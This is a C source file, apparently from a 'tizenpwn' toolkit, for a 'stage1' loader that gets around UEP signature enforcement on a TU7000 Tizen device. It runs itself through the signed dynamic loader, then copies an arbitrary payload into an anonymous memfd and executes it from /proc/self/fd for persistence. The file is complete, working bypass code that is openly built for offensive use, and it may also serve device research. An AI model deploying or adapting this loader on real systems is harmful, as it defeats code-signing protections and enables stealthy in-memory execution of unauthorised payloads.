/*
 * Dynamic stage1 loader for the TU7000 persistence rail.
 *
 * UEP blocks unsigned shared objects and unsigned on-disk executables. This
 * program is itself unsigned, but it is started as data by the signed dynamic
 * loader:
 *
 *   /lib/ld-linux-armhf.so.3 /path/to/stage1 /path/to/static-payload [args]
 *
 * stage1 copies the static payload into a memfd and executes that anonymous
 * file. It does not modify UEP or any system file.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#if defined(__arm__)
#ifndef SYS_memfd_create
#define SYS_memfd_create 385
#endif
#elif defined(__x86_64__)
#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif
#endif

static int copy_to_memfd(const char *path) {
    char buffer[65536];
    const char name[] = "tizenpwn-stage1";
    int input;
    int output;
    ssize_t count;

    input = open(path, O_RDONLY | O_CLOEXEC);
    if (input < 0) {
        fprintf(stderr, "stage1: open %s: %s\n", path, strerror(errno));
        return -1;
    }
    output = (int)syscall(SYS_memfd_create, name, 0);
    if (output < 0) {
        fprintf(stderr, "stage1: memfd_create: %s\n", strerror(errno));
        close(input);
        return -1;
    }
    while ((count = read(input, buffer, sizeof(buffer))) > 0) {
        ssize_t offset = 0;
        while (offset < count) {
            ssize_t written = write(
                output, buffer + offset, (size_t)(count - offset)
            );
            if (written <= 0) {
                fprintf(
                    stderr,
                    "stage1: write payload: %s\n",
                    strerror(errno)
                );
                close(input);
                close(output);
                return -1;
            }
            offset += written;
        }
    }
    if (count < 0) {
        fprintf(stderr, "stage1: read %s: %s\n", path, strerror(errno));
        close(input);
        close(output);
        return -1;
    }
    close(input);
    if (fchmod(output, 0700) != 0) {
        fprintf(stderr, "stage1: fchmod: %s\n", strerror(errno));
        close(output);
        return -1;
    }
    return output;
}

int main(int argc, char **argv) {
    char path[64];
    int fd;

    if (argc < 2) {
        fprintf(stderr, "usage: %s PAYLOAD [ARGS...]\n", argv[0]);
        return 2;
    }
    fd = copy_to_memfd(argv[1]);
    if (fd < 0) {
        return 1;
    }
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    execv(path, &argv[1]);
    fprintf(stderr, "stage1: execv %s: %s\n", path, strerror(errno));
    close(fd);
    return 1;
}
